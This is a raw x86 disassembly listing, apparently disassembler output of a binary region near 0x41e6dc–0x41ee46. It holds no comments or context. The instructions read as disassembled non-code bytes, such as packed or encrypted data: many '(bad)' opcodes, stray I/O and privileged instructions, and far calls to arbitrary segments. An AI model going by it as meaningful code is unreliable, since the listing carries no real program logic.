  41e6dc:	ret    0x91b
  41e6df:	mov    esp,0x2c6b91b0
  41e6e4:	call   FWORD PTR [ebp+0x62]
  41e6e7:	repnz mov ecx,edi
  41e6ea:	popa   
  41e6eb:	sbb    bl,0x8e
  41e6ee:	sub    al,0xb
  41e6f0:	fwait
  41e6f1:	sar    DWORD PTR [edx+0x7cf7dd45],0x84
  41e6f8:	pop    edx
  41e6f9:	pop    DWORD PTR [edx]
  41e6fb:	and    al,0x7d
  41e6fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6fe:	jbe    0x41e714
  41e700:	test   al,0x54
  41e702:	fs jp  0x41e6f6
  41e705:	or     esi,DWORD PTR [ebp+0x7efbdb2d]
  41e70b:	xor    DWORD PTR [si+0xd],esp
  41e70f:	clc    
  41e710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e711:	jae    0x41e6bb
  41e713:	repnz call 0x3fc4:0x1fbc0f9b
  41e71b:	sahf   
  41e71c:	(bad)  
  41e71d:	push   ebx
  41e71e:	jnp    0x41e6bb
  41e720:	int3   
  41e721:	xchg   DWORD PTR [edx],esp
  41e723:	xchg   ebp,eax
  41e724:	add    ch,0xc0
  41e727:	lds    ecx,FWORD PTR [edx]
  41e729:	jnp    0x41e75a
  41e72b:	cmp    eax,0x9d947e59
  41e730:	popf   
  41e731:	fnstenv [edx]
  41e733:	mov    ch,BYTE PTR [esi-0x5d]
  41e736:	(bad)  
  41e737:	push   ss
  41e738:	jae    0x41e6df
  41e73a:	push   ebx
  41e73b:	mov    edx,0x2fbcd5a4
  41e740:	jbe    0x41e6d8
  41e742:	clc    
  41e743:	mov    bh,0x6d
  41e745:	sub    dh,BYTE PTR [edi+eax*8-0x42786b26]
  41e74c:	loope  0x41e79c
  41e74e:	and    esi,DWORD PTR [ecx-0x59b7259a]
  41e754:	rcr    edi,1
  41e756:	mov    DWORD PTR [edi-0xbcc8915],ebp
  41e75c:	cmp    cl,BYTE PTR [ebp-0x79]
  41e75f:	pop    es
  41e760:	les    edx,FWORD PTR [eax+0x252bfc2d]
  41e766:	add    eax,0x2068d930
  41e76b:	mov    dh,0x79
  41e76d:	(bad)  
  41e76e:	shl    BYTE PTR [ebx+0x2d],0xf7
  41e772:	dec    eax
  41e773:	mov    esi,0x13d7d8b9
  41e778:	jmp    0x41e750
  41e77a:	sbb    ecx,DWORD PTR [esi]
  41e77c:	std    
  41e77d:	scas   eax,DWORD PTR es:[edi]
  41e77e:	(bad)  
  41e77f:	pusha  
  41e780:	cmp    edx,DWORD PTR [eax*4-0x5eac73a4]
  41e787:	ins    BYTE PTR es:[edi],dx
  41e788:	sub    ecx,ebp
  41e78a:	out    dx,eax
  41e78b:	mov    BYTE PTR [ecx+0x57d505af],bh
  41e791:	aas    
  41e792:	int3   
  41e793:	js     0x41e7b3
  41e795:	dec    esi
  41e796:	ss dec edx
  41e798:	cmp    eax,DWORD PTR [ebp-0x4dfc7884]
  41e79e:	mov    DWORD PTR [ebx+0x76ee2818],ebx
  41e7a4:	pop    esi
  41e7a5:	pop    ebp
  41e7a6:	aam    0xa6
  41e7a8:	lods   al,BYTE PTR ds:[esi]
  41e7a9:	lahf   
  41e7aa:	mov    ?,WORD PTR [eax]
  41e7ac:	sbb    eax,0xbcfb54c4
  41e7b1:	sub    eax,0x1a24b921
  41e7b6:	jbe    0x41e775
  41e7b8:	ret    
  41e7b9:	loop   0x41e745
  41e7bb:	adc    BYTE PTR [ebx-0x3a],ch
  41e7be:	adc    eax,0xdfd6d192
  41e7c3:	(bad)  
  41e7c5:	inc    edi
  41e7c6:	inc    esp
  41e7c7:	dec    edx
  41e7c8:	and    bl,BYTE PTR [esi]
  41e7ca:	push   0xbc32c27e
  41e7cf:	shr    cl,0x1c
  41e7d2:	ficom  DWORD PTR [esi]
  41e7d4:	or     eax,0x10a77216
  41e7d9:	jmp    0x35b94af0
  41e7de:	cwde   
  41e7df:	inc    edx
  41e7e0:	mov    ds:0x199c4480,eax
  41e7e5:	dec    esp
  41e7e6:	and    al,0xce
  41e7e8:	sbb    bl,dl
  41e7ea:	popa   
  41e7eb:	cmp    DWORD PTR [esi+0x5498a8f8],edi
  41e7f1:	jmp    0x41e7ff
  41e7f3:	xchg   ebx,eax
  41e7f4:	push   esi
  41e7f5:	or     esi,edx
  41e7f7:	mov    ds:0xbd694e67,al
  41e7fc:	ret    0x54b4
  41e7ff:	dec    ecx
  41e800:	xchg   edx,eax
  41e801:	mov    eax,cs:0x593d99db
  41e807:	lea    esp,ds:0xc7b6fabd
  41e80d:	xchg   edx,eax
  41e80e:	test   DWORD PTR [ecx-0x17],esp
  41e811:	mov    esi,0x4412bbc7
  41e816:	dec    eax
  41e817:	jbe    0x41e892
  41e819:	inc    BYTE PTR gs:[eax+0x7]
  41e81d:	icebp  
  41e81e:	push   edx
  41e81f:	mov    edx,0x81998fcd
  41e824:	mov    esp,0x75fa1688
  41e829:	cmp    ch,BYTE PTR [edx*2+0x550b6b0e]
  41e830:	xor    BYTE PTR [edx+0x8],bh
  41e833:	das    
  41e834:	inc    ebx
  41e835:	add    BYTE PTR [esi],dl
  41e837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e838:	or     WORD PTR [ebx+0x17f290ea],bx
  41e83f:	sbb    BYTE PTR [ecx+0x6d],al
  41e842:	pop    edx
  41e843:	and    dl,BYTE PTR [edi]
  41e845:	repz daa 
  41e847:	pop    edx
  41e848:	test   BYTE PTR [edi-0x28],dl
  41e84b:	std    
  41e84c:	xor    eax,0xf4a371b6
  41e851:	inc    esi
  41e852:	inc    eax
  41e853:	mov    esi,0x38ff9379
  41e858:	out    0x47,al
  41e85a:	sbb    al,0xa5
  41e85c:	mov    edx,0x8a49a6cd
  41e861:	xchg   esi,eax
  41e862:	in     al,dx
  41e863:	addr16 add al,0xcf
  41e866:	jo     0x41e80e
  41e868:	icebp  
  41e869:	inc    ecx
  41e86a:	mov    esi,0x1fd41f94
  41e86f:	gs pop ebx
  41e871:	mov    al,ds:0x6a2a68b6
  41e876:	or     bl,BYTE PTR [esi]
  41e878:	call   0x9635:0x7119e386
  41e87f:	pop    esi
  41e880:	aad    0xa7
  41e882:	call   0x18b214f1
  41e887:	fs xchg edx,eax
  41e889:	inc    ebp
  41e88a:	pop    ebx
  41e88b:	cli    
  41e88c:	xor    DWORD PTR ds:0x1b31979e,edx
  41e892:	in     al,0x87
  41e894:	mov    ebx,0xd0d5e24
  41e899:	adc    al,0x20
  41e89b:	lods   al,BYTE PTR ds:[esi]
  41e89c:	ficom  WORD PTR [esi+0x9fa2c47]
  41e8a2:	pop    eax
  41e8a3:	adc    edx,DWORD PTR [ebx+edi*2-0x5ef43d6f]
  41e8aa:	test   al,0xec
  41e8ac:	cmp    DWORD PTR [ebp+0x36],edi
  41e8af:	addr16 jl 0x41e920
  41e8b2:	icebp  
  41e8b3:	xor    eax,0x352a7cb7
  41e8b8:	mov    al,0xf6
  41e8ba:	stc    
  41e8bb:	fiadd  DWORD PTR [ebx+0x272846c]
  41e8c1:	rol    ebx,cl
  41e8c3:	sbb    BYTE PTR [ecx],ah
  41e8c5:	cmp    cl,ah
  41e8c7:	dec    esi
  41e8c8:	out    0xbe,al
  41e8ca:	sub    bh,cl
  41e8cc:	imul   esi,esi,0x2b16a544
  41e8d2:	mov    ah,0xf0
  41e8d4:	repnz fs cmp BYTE PTR fs:[ebp+0xa],bl
  41e8da:	mov    WORD PTR [ebx+0x3f],ds
  41e8dd:	inc    ebp
  41e8de:	iret   
  41e8df:	aam    0xdf
  41e8e1:	adc    ecx,eax
  41e8e3:	(bad)  
  41e8e4:	es push 0x5d
  41e8e7:	fst    QWORD PTR [ecx+0x13]
  41e8ea:	das    
  41e8eb:	inc    edx
  41e8ec:	push   esi
  41e8ed:	mov    ds:0x8246a695,eax
  41e8f2:	in     al,dx
  41e8f3:	arpl   WORD PTR [esi+edx*1-0x4e],sp
  41e8f7:	xchg   edi,eax
  41e8f8:	int    0x6f
  41e8fa:	mov    ds:0xd5cced30,al
  41e8ff:	jp     0x41e979
  41e901:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e902:	sbb    DWORD PTR [edi+eax*1],ebx
  41e905:	gs retf 
  41e907:	mov    esi,0x601a844e
  41e90c:	xchg   BYTE PTR [esi+0x4f],dh
  41e90f:	out    0x6b,al
  41e911:	pushf  
  41e912:	cmp    al,0x40
  41e914:	test   BYTE PTR [ebx+0x46],ch
  41e917:	sar    dl,cl
  41e919:	cmp    bh,dh
  41e91b:	sub    bl,BYTE PTR [edi-0x59]
  41e91e:	jns    0x41e8df
  41e920:	test   DWORD PTR [edi],eax
  41e922:	pop    edi
  41e923:	pop    edx
  41e924:	pop    edx
  41e925:	(bad)  
  41e926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e927:	jno    0x41e930
  41e929:	arpl   WORD PTR [ebx],bx
  41e92b:	test   DWORD PTR [edi+esi*8+0x444d00cb],ebx
  41e932:	stc    
  41e933:	mov    BYTE PTR gs:[ebx+0x18ed7c24],dh
  41e93a:	into   
  41e93b:	cmp    al,0xcc
  41e93d:	adc    BYTE PTR [esi-0x26c57e99],bh
  41e943:	adc    ch,BYTE PTR [ecx]
  41e945:	cmp    BYTE PTR [edi],0x5d
  41e948:	dec    ebx
  41e949:	push   es
  41e94a:	and    BYTE PTR [esi-0x25],dl
  41e94d:	cs mov ecx,0x60da8890
  41e953:	add    DWORD PTR [edi+0x76],ecx
  41e956:	(bad)  
  41e957:	xor    esi,DWORD PTR [ebp+ebp*1+0x8343dab]
  41e95e:	add    ecx,esi
  41e960:	(bad)  
  41e961:	and    BYTE PTR [edi],dl
  41e963:	jb     0x41e927
  41e965:	xor    ebx,DWORD PTR [ecx]
  41e967:	sub    eax,0xf08443a2
  41e96c:	add    DWORD PTR gs:[ebx],ebx
  41e96f:	pusha  
  41e970:	pop    ds
  41e971:	jecxz  0x41e9aa
  41e973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e974:	dec    edx
  41e975:	test   eax,0x55c9f295
  41e97a:	pushf  
  41e97b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e97c:	outs   dx,DWORD PTR ds:[esi]
  41e97d:	and    dh,al
  41e97f:	(bad)  
  41e980:	inc    ebp
  41e981:	jnp    0x41e966
  41e983:	cdq    
  41e984:	jg     0x41e962
  41e986:	push   0xffffff95
  41e988:	push   esi
  41e989:	add    BYTE PTR [ecx-0x1f],dl
  41e98c:	fistp  DWORD PTR [ecx-0x1f]
  41e98f:	or     ch,cl
  41e991:	push   cs
  41e992:	frstor [esi+0x1005df50]
  41e998:	inc    edx
  41e999:	xor    eax,0x7d1c30e5
  41e99e:	or     bl,BYTE PTR [ebx-0x5232d6e1]
  41e9a4:	je     0x41e9cb
  41e9a6:	ins    BYTE PTR es:[edi],dx
  41e9a7:	jl     0x41ea1d
  41e9a9:	inc    edi
  41e9aa:	das    
  41e9ab:	jge    0x41ea04
  41e9ad:	cmc    
  41e9ae:	cld    
  41e9af:	dec    eax
  41e9b0:	jno    0x41e9d0
  41e9b2:	call   0x60a3:0xe31058b6
  41e9b9:	or     al,0x16
  41e9bb:	shr    esi,cl
  41e9bd:	jno    0x41e957
  41e9bf:	fisttp WORD PTR [eax]
  41e9c1:	add    ecx,eax
  41e9c3:	adc    al,0xe3
  41e9c5:	sbb    edi,esp
  41e9c7:	sahf   
  41e9c8:	ins    BYTE PTR es:[edi],dx
  41e9c9:	mov    bh,0xf5
  41e9cb:	aam    0xd8
  41e9cd:	(bad)  
  41e9ce:	xor    eax,DWORD PTR [ebx+0x74f3fd34]
  41e9d4:	(bad)  
  41e9d5:	push   0xfafd4563
  41e9da:	xor    DWORD PTR [ecx-0x4501ae46],ebp
  41e9e0:	test   DWORD PTR [eax+0x7fa9f19b],edx
  41e9e6:	dec    DWORD PTR [ebx+0x2]
  41e9e9:	push   ds
  41e9ea:	xchg   ebx,eax
  41e9eb:	push   ss
  41e9ec:	test   BYTE PTR [ecx+ecx*2-0x63fbf49c],bh
  41e9f3:	mov    ebp,0x95d24d6f
  41e9f8:	cmc    
  41e9f9:	add    ah,BYTE PTR [edi+0x4b]
  41e9fc:	cmp    eax,0x7433f89a
  41ea01:	adc    cl,BYTE PTR [edx-0x5af62c38]
  41ea07:	repz jb 0x41ea24
  41ea0a:	jge    0x41e99d
  41ea0c:	push   eax
  41ea0d:	shl    esi,1
  41ea0f:	mov    eax,0x278e4498
  41ea14:	pusha  
  41ea15:	jg     0x41e9a8
  41ea17:	daa    
  41ea18:	cmp    BYTE PTR [ecx],ah
  41ea1a:	aam    0x9d
  41ea1c:	cli    
  41ea1d:	inc    esi
  41ea1e:	or     al,0x26
  41ea20:	faddp  st(7),st
  41ea22:	sbb    DWORD PTR [ecx-0x12e96a32],0xffffff8a
  41ea29:	ins    DWORD PTR es:[edi],dx
  41ea2a:	cwde   
  41ea2b:	add    eax,0x7e642cb2
  41ea30:	xor    ah,BYTE PTR [ecx-0x14c367ea]
  41ea36:	inc    edx
  41ea37:	ins    BYTE PTR es:[edi],dx
  41ea38:	nop
  41ea39:	or     edi,esi
  41ea3b:	or     BYTE PTR [edi+0x1f13ba65],bh
  41ea41:	mov    esp,0x78380472
  41ea46:	aad    0x4d
  41ea48:	jmp    0x79bb01cd
  41ea4d:	lods   al,BYTE PTR ds:[esi]
  41ea4e:	inc    edi
  41ea4f:	jbe    0x41e9fd
  41ea51:	xchg   edi,eax
  41ea52:	loopne 0x41ea1c
  41ea54:	jmp    DWORD PTR [edi+0x2]
  41ea57:	bnd ret 
  41ea59:	xor    eax,0xce945636
  41ea5e:	adc    al,BYTE PTR [esi]
  41ea60:	pop    ebx
  41ea61:	mov    ah,0x6
  41ea63:	xchg   ebx,eax
  41ea64:	shl    ebx,1
  41ea66:	(bad)  
  41ea67:	gs xchg esp,eax
  41ea69:	jae    0x41ea61
  41ea6b:	shl    BYTE PTR [esi],cl
  41ea6d:	xor    eax,0x314fc18f
  41ea72:	test   al,0x65
  41ea74:	scas   eax,DWORD PTR es:[edi]
  41ea75:	sti    
  41ea76:	mov    ebx,0xccbd65e0
  41ea7b:	push   ecx
  41ea7c:	mov    ecx,0xe5feb3e3
  41ea81:	pop    eax
  41ea82:	cld    
  41ea83:	sti    
  41ea84:	pop    esi
  41ea85:	inc    esi
  41ea86:	pop    eax
  41ea87:	jmp    0x1f788fd2
  41ea8c:	fldcw  WORD PTR [edi-0x2d]
  41ea8f:	mov    eax,0xc1979d45
  41ea94:	retf   
  41ea95:	mov    ebx,ebp
  41ea97:	dec    esi
  41ea98:	ins    BYTE PTR es:[edi],dx
  41ea99:	sbb    ebp,DWORD PTR [ebx+0x40]
  41ea9c:	call   FWORD PTR [ecx-0x2e3a9b7f]
  41eaa2:	xchg   esp,eax
  41eaa3:	int    0xe1
  41eaa5:	test   edx,esp
  41eaa7:	inc    edx
  41eaa8:	inc    ebx
  41eaa9:	mov    DWORD PTR [ebx+0xd7d5b97],ebp
  41eaaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eab0:	scas   al,BYTE PTR es:[edi]
  41eab1:	jecxz  0x41ea36
  41eab3:	xchg   esi,eax
  41eab4:	xor    bl,BYTE PTR [bp+0x57]
  41eab8:	inc    ebx
  41eab9:	dec    ecx
  41eaba:	pushf  
  41eabb:	xchg   BYTE PTR [edx+0x21cec379],ch
  41eac1:	jecxz  0x41ea65
  41eac3:	xlat   BYTE PTR ds:[ebx]
  41eac4:	shl    dl,0x6a
  41eac7:	jne    0x41eaea
  41eac9:	repz inc edx
  41eacb:	ja     0x41eb4b
  41eacd:	inc    ebx
  41eace:	jecxz  0x41eb3a
  41ead0:	and    eax,DWORD PTR [ecx+0x73]
  41ead3:	fldenv [ebx+0x4a]
  41ead6:	xor    DWORD PTR [edi],0x7d
  41ead9:	push   edi
  41eada:	dec    eax
  41eadb:	jae    0x41ead7
  41eadd:	popa   
  41eade:	jmp    0x11b9ccfa
  41eae3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae4:	out    dx,eax
  41eae5:	mov    WORD PTR [ebx-0x17570fe8],?
  41eaeb:	inc    esp
  41eaec:	mov    eax,0x3de98858
  41eaf1:	sbb    edi,DWORD PTR es:[eax]
  41eaf4:	xor    eax,0xfa30918e
  41eaf9:	pop    ecx
  41eafa:	lods   al,BYTE PTR ds:[esi]
  41eafb:	mov    dl,0xc8
  41eafd:	inc    edx
  41eafe:	add    BYTE PTR [ebp-0x44],0x5c
  41eb02:	outs   dx,BYTE PTR ds:[esi]
  41eb03:	push   ecx
  41eb04:	xor    al,0xd4
  41eb06:	in     al,0xc5
  41eb08:	add    BYTE PTR [edx-0x77],dh
  41eb0b:	xchg   esp,eax
  41eb0c:	dec    cx
  41eb0e:	sbb    eax,0x4a2b724b
  41eb13:	fdivr  QWORD PTR [ebp+edi*2+0x54fd1518]
  41eb1a:	outs   dx,BYTE PTR ds:[esi]
  41eb1b:	dec    eax
  41eb1c:	pop    ebp
  41eb1d:	push   ebp
  41eb1e:	jb     0x41eae9
  41eb20:	or     DWORD PTR [eax+edi*2],edi
  41eb23:	jns    0x41eb53
  41eb25:	jnp    0x41eaca
  41eb27:	gs test DWORD PTR cs:[edi-0x6037f730],ebp
  41eb2f:	test   DWORD PTR ds:0xb958ae70,edx
  41eb35:	retf   0xc283
  41eb38:	adc    eax,0xa42873ed
  41eb3d:	in     al,dx
  41eb3e:	add    DWORD PTR [edx+0x7c11a081],ebx
  41eb44:	out    dx,eax
  41eb45:	jmp    0x41eb85
  41eb47:	outs   dx,DWORD PTR ds:[esi]
  41eb48:	xor    edi,DWORD PTR [edi-0x6e]
  41eb4b:	pop    esp
  41eb4c:	stos   DWORD PTR es:[edi],eax
  41eb4d:	or     BYTE PTR [eax],ch
  41eb4f:	xchg   ebp,eax
  41eb50:	mov    ds:0xad8dd04c,eax
  41eb55:	sbb    BYTE PTR ds:0x9bd88ff7,0xda
  41eb5c:	bound  edx,QWORD PTR [edi-0x69dcfbec]
  41eb62:	aam    0xf0
  41eb64:	shl    ebx,1
  41eb66:	out    0x58,eax
  41eb68:	adc    bl,cl
  41eb6a:	sbb    eax,edx
  41eb6c:	inc    ebp
  41eb6d:	adc    BYTE PTR [esi],0x7f
  41eb70:	mov    eax,ds:0xa8eb8cb4
  41eb75:	out    dx,eax
  41eb76:	sbb    al,0x22
  41eb78:	out    0xbf,al
  41eb7a:	inc    edx
  41eb7b:	sbb    DWORD PTR [edx],ebp
  41eb7d:	cwde   
  41eb7e:	mov    al,ds:0x99ecf8ed
  41eb83:	sahf   
  41eb84:	mov    gs,WORD PTR [edi]
  41eb86:	xchg   edx,eax
  41eb87:	adc    al,0x67
  41eb89:	jno    0x41eb28
  41eb8b:	xchg   esi,eax
  41eb8c:	sbb    DWORD PTR [ecx],0x3c6e8b57
  41eb92:	adc    al,BYTE PTR [esi]
  41eb94:	popa   
  41eb95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb96:	ret    0xc42c
  41eb99:	enter  0x7839,0x55
  41eb9d:	adc    DWORD PTR [eax+eiz*8-0x1ca0b568],esi
  41eba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eba5:	sbb    ecx,DWORD PTR [esi+0x7afe57e5]
  41ebab:	push   ds
  41ebac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ebad:	test   DWORD PTR [ebp+0x5f],edi
  41ebb0:	dec    ebp
  41ebb1:	dec    esp
  41ebb2:	in     eax,dx
  41ebb3:	int3   
  41ebb4:	pushf  
  41ebb5:	mov    ch,0x2b
  41ebb7:	dec    esi
  41ebb8:	cmp    DWORD PTR [ebx-0x5c],ebx
  41ebbb:	out    dx,al
  41ebbc:	retf   0x3a7d
  41ebbf:	sub    al,0x88
  41ebc1:	inc    ebp
  41ebc2:	inc    edi
  41ebc3:	inc    eax
  41ebc4:	popa   
  41ebc5:	aad    0xf9
  41ebc7:	xlat   BYTE PTR ds:[ebx]
  41ebc8:	mov    ebx,0x6b358da3
  41ebcd:	jnp    0x41ebcb
  41ebcf:	fcom   DWORD PTR [esi-0x8afaf68]
  41ebd5:	arpl   WORD PTR ss:[ebx],ax
  41ebd8:	mov    edi,0x9d218cd5
  41ebdd:	pop    edx
  41ebde:	in     eax,0x8f
  41ebe0:	loopne 0x41ebcc
  41ebe2:	mov    edx,0x62ec1d82
  41ebe7:	shr    edi,cl
  41ebe9:	cmp    BYTE PTR ds:0x226af93a,dh
  41ebef:	clc    
  41ebf0:	out    dx,eax
  41ebf1:	fimul  WORD PTR [esi]
  41ebf3:	out    0x78,eax
  41ebf5:	xor    ebp,eax
  41ebf7:	fxch   st(0)
  41ebf9:	push   ds
  41ebfa:	aad    0x30
  41ebfc:	fistp  DWORD PTR [esp+edx*1-0x30]
  41ec00:	sar    DWORD PTR ds:0xdf040d2d,1
  41ec06:	adc    al,0x2c
  41ec08:	repz aam 0x3a
  41ec0b:	int3   
  41ec0c:	cmp    cl,ah
  41ec0e:	lea    ebp,[ecx+eiz*2-0xfeceb27]
  41ec15:	pop    ebx
  41ec16:	xchg   BYTE PTR [eax+0x4af6150e],dh
  41ec1c:	lock scas eax,DWORD PTR es:[edi]
  41ec1e:	push   cs
  41ec1f:	imul   esi,DWORD PTR [ecx-0x3e],0xe735b30e
  41ec26:	fsub   QWORD PTR [eax+0x5d4465da]
  41ec2c:	mov    ds:0xd9f61508,al
  41ec31:	loop   0x41ebe9
  41ec33:	fild   QWORD PTR [eax]
  41ec35:	sub    ch,ah
  41ec37:	dec    edi
  41ec38:	aam    0x7a
  41ec3a:	rol    DWORD PTR [ebx+esi*8],0x6f
  41ec3e:	shr    DWORD PTR [ebx+0x3f79a9d9],0xcd
  41ec45:	xchg   edi,eax
  41ec46:	fwait
  41ec47:	loop   0x41ec29
  41ec49:	fnstcw WORD PTR [eax]
  41ec4b:	and    cl,BYTE PTR [edi-0x4f461eee]
  41ec51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec52:	icebp  
  41ec53:	mov    dl,0x27
  41ec55:	fsub   DWORD PTR [eax]
  41ec57:	scas   eax,DWORD PTR es:[edi]
  41ec58:	(bad)  
  41ec59:	mov    cl,BYTE PTR [esi]
  41ec5b:	test   al,0x3d
  41ec5d:	inc    esp
  41ec5e:	inc    esi
  41ec5f:	call   0xde42:0xf9fdf945
  41ec66:	fld    QWORD PTR [edi+0x29]
  41ec69:	sar    DWORD PTR [ebx],cl
  41ec6b:	and    ch,BYTE PTR [eax]
  41ec6d:	test   DWORD PTR [eax+0x6c],0xa56d59c6
  41ec74:	adc    cl,BYTE PTR [eax-0x52]
  41ec77:	sbb    dh,BYTE PTR [esi]
  41ec79:	sub    dl,0x2a
  41ec7c:	cs js  0x41ecf9
  41ec7f:	out    0xed,al
  41ec81:	jle    0x41eca6
  41ec83:	dec    ebx
  41ec84:	jle    0x41ec0d
  41ec86:	imul   ebp,ebx,0xffffffba
  41ec89:	daa    
  41ec8a:	call   0x70a46e21
  41ec8f:	fnsave ds:0x5c1053a7
  41ec95:	xchg   esi,eax
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	xchg   ecx,eax
  41ec98:	fist   DWORD PTR [edx+0x29]
  41ec9b:	adc    al,0x77
  41ec9d:	inc    ebx
  41ec9e:	pop    edx
  41ec9f:	jl     0x41ecc7
  41eca1:	mov    eax,0xc342ad09
  41eca6:	call   0xccca:0x84e3e49f
  41ecad:	or     DWORD PTR [esi+0x3b1b1a9b],ecx
  41ecb3:	push   edi
  41ecb4:	mov    edi,0x1fc49f1b
  41ecb9:	shl    DWORD PTR [ecx],cl
  41ecbb:	stc    
  41ecbc:	pop    esp
  41ecbd:	aad    0xc
  41ecbf:	sbb    eax,0x74ddc9b4
  41ecc4:	scas   al,BYTE PTR es:[edi]
  41ecc5:	fs xchg ebp,eax
  41ecc7:	or     bh,cl
  41ecc9:	call   0x1872:0x309ac1ea
  41ecd0:	mov    edx,0x13179c29
  41ecd5:	inc    esp
  41ecd6:	pop    ds
  41ecd7:	adc    eax,DWORD PTR [edx+0x7e032d6a]
  41ecdd:	inc    ebx
  41ecde:	xchg   ebp,eax
  41ecdf:	das    
  41ece0:	shl    dh,cl
  41ece2:	(bad)  [edx+ebp*2]
  41ece5:	jns    0x41ec93
  41ece7:	mov    eax,0x565847ab
  41ecec:	jae    0x41ec70
  41ecee:	outs   dx,BYTE PTR ds:[esi]
  41ecef:	sti    
  41ecf0:	inc    esi
  41ecf1:	imul   edi,DWORD PTR es:[ecx-0x2398534e],0xffffffce
  41ecf9:	mov    BYTE PTR [esi-0x4244f1e2],0x91
  41ed00:	aam    0xd3
  41ed02:	cmp    BYTE PTR [ebp+0x594a63f8],dl
  41ed08:	mov    al,0x3a
  41ed0a:	or     al,0xca
  41ed0c:	sahf   
  41ed0d:	popf   
  41ed0e:	mov    bl,BYTE PTR [edx]
  41ed10:	sti    
  41ed11:	repnz mov ah,0x33
  41ed14:	test   eax,0xf482be73
  41ed19:	mov    bh,0x6f
  41ed1b:	xchg   edx,eax
  41ed1c:	mov    bl,0xe9
  41ed1e:	push   ss
  41ed1f:	cmp    eax,0x513969aa
  41ed24:	mov    eax,ds:0xd2c5e929
  41ed29:	mov    dh,0x9
  41ed2b:	and    al,0x3f
  41ed2d:	imul   edi,DWORD PTR ss:[ecx+0x4bd35d4d],0x61207bd4
  41ed38:	mov    al,dh
  41ed3a:	mov    ds:0x1f74cc81,al
  41ed3f:	mov    esp,0x4ece9449
  41ed44:	push   esp
  41ed45:	in     al,0x4c
  41ed47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed48:	jne    0x41ed4c
  41ed4a:	push   0x79
  41ed4c:	mov    ah,0xe4
  41ed4e:	inc    ecx
  41ed4f:	pop    edi
  41ed50:	hlt    
  41ed51:	aaa    
  41ed52:	pop    ss
  41ed53:	add    esi,ebx
  41ed55:	mov    al,ds:0x5f76a79a
  41ed5a:	(bad)  
  41ed5b:	enter  0xba14,0x7c
  41ed5f:	ins    DWORD PTR es:[edi],dx
  41ed60:	jne    0x41ed83
  41ed62:	cmp    esp,eax
  41ed64:	pop    eax
  41ed65:	out    0xe9,al
  41ed67:	dec    esp
  41ed68:	xor    BYTE PTR [ebx-0x6ba96977],0xb3
  41ed6f:	sbb    DWORD PTR [ebx+ecx*8],edi
  41ed72:	mov    edi,0x31467c4e
  41ed77:	xchg   ecx,eax
  41ed78:	xor    dl,BYTE PTR [edi+0x7d321e78]
  41ed7e:	sub    bl,ch
  41ed80:	ins    BYTE PTR es:[edi],dx
  41ed81:	out    dx,eax
  41ed82:	std    
  41ed83:	jp     0x41ed61
  41ed85:	(bad)  
  41ed86:	sbb    esp,DWORD PTR [edi-0x57]
  41ed89:	sar    cl,cl
  41ed8b:	imul   edi,DWORD PTR [edi+0x49],0x12
  41ed8f:	adc    BYTE PTR [esi],bl
  41ed91:	scas   al,BYTE PTR es:[edi]
  41ed92:	out    0xc2,eax
  41ed94:	push   eax
  41ed95:	fwait
  41ed96:	cmc    
  41ed97:	mov    ds:0x399ed5ac,eax
  41ed9c:	pop    ecx
  41ed9d:	pop    ebp
  41ed9e:	xchg   esp,eax
  41ed9f:	sbb    eax,0xf7dd1e08
  41eda4:	inc    eax
  41eda5:	cdq    
  41eda6:	les    eax,FWORD PTR [ebp+0x23]
  41eda9:	iret   
  41edaa:	outs   dx,DWORD PTR ds:[esi]
  41edab:	ficomp WORD PTR [ebx]
  41edad:	or     DWORD PTR [eax-0x2f54c2af],edx
  41edb3:	ja     0x41ee0f
  41edb5:	clc    
  41edb6:	jae    0x41eda2
  41edb8:	sbb    ebp,DWORD PTR [ebp-0x59]
  41edbb:	rcl    esi,cl
  41edbd:	dec    edx
  41edbe:	pop    ss
  41edbf:	shl    BYTE PTR [esi+0x4f],cl
  41edc2:	sbb    bl,BYTE PTR [esi-0x109aa4e5]
  41edc8:	jmp    0x41ed93
  41edca:	leave  
  41edcb:	daa    
  41edcc:	mov    esp,0xdaf917b9
  41edd1:	gs dec edx
  41edd3:	into   
  41edd4:	xor    al,0xb6
  41edd6:	sub    eax,DWORD PTR [ecx-0x25081aad]
  41eddc:	ror    DWORD PTR [eax+ecx*8-0x19807787],0x46
  41ede4:	out    dx,al
  41ede5:	fiadd  WORD PTR [ecx-0x7fabe9ed]
  41edeb:	adc    DWORD PTR [edx],ebp
  41eded:	mov    al,ds:0xc611deed
  41edf2:	mov    eax,0x96d43660
  41edf7:	xchg   ecx,eax
  41edf8:	cli    
  41edf9:	and    DWORD PTR [eax-0x2cac8c3e],0x7e3a21f1
  41ee03:	sbb    edx,0x6d
  41ee06:	fmul   QWORD PTR [edx+0x6c]
  41ee09:	mov    ebp,0xfbeab6e7
  41ee0e:	in     eax,dx
  41ee0f:	in     eax,0x65
  41ee11:	jge    0x41ee38
  41ee13:	cli    
  41ee14:	xchg   DWORD PTR ds:[edx],esi
  41ee17:	mov    eax,0x3e6c305
  41ee1c:	cli    
  41ee1d:	or     al,0x80
  41ee1f:	jmp    0x6b08:0x9ae8538a
  41ee26:	fwait
  41ee27:	leave  
  41ee28:	mov    bx,0x6b9d
  41ee2c:	bound  esi,QWORD PTR [ebp+0xbe5c261]
  41ee32:	fmul   st,st(6)
  41ee34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee35:	jmp    0x41ee68
  41ee37:	(bad)
  41ee3b:	pushf  
  41ee3c:	sub    eax,0xcf9fbfe8
  41ee41:	jecxz  0x41edcb
  41ee43:	xor    DWORD PTR [eax],0xffffff95
  41ee46:	dec    esi
